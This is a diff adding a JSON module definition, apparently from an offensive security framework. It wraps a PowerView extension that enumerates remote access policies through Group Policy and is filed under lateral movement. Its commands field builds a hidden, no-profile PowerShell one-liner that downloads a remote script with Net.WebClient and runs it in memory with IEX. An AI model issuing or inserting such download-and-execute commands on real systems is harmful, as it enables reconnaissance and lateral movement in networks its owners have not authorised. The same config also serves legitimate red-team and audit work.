@@ -1,0 +1,30 @@
+{
+  "base": {
+    "name": "Find-ComputersWithRemoteAccessPolicies",
+    "author": ["William Knowles (@william_knows)","Jon Cave (@joncave)"],
+    "path": ["windows", "x64", "powershell", "lateral", "gpo","Find-ComputersWithRemoteAccessPolicies.json"],
+    "platform": "windows",
+    "arch": "x64",
+    "lang": "powershell",
+    "privilege": false,
+    "notes": "PowerView extensions for enumerating remote access policies through group policy. Blog Post: https://labs.mwrinfosecurity.com/blog/enumerating-remote-access-policies-through-gpo/",
+    "remote": "https://raw.githubusercontent.com/mwrlabs/gists/master/PowerView-with-RemoteAccessPolicyEnumeration.ps1",
+    "local": ["data", "src", "mwrlabs", "gists", "Find-ComputersWithRemoteAccessPolicies.ps1"],
+    "options": {
+      "Domain": [],
+      "SearchBase": [],
+      "SearchScope": [],
+      "Server": [],
+      "ResultPageSize": [],
+      "ServerTimeLimit": [],
+      "Credential": []
+    },
+    "description": "",
+    "commands": [
+      "powershell.exe",
+      "-nop",
+      "-w 0",
+      "\"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mwrlabs/gists/master/PowerView-with-RemoteAccessPolicyEnumeration.ps1');Find-ComputersWithRemoteAccessPolicies\""
+    ]
+  }
+}
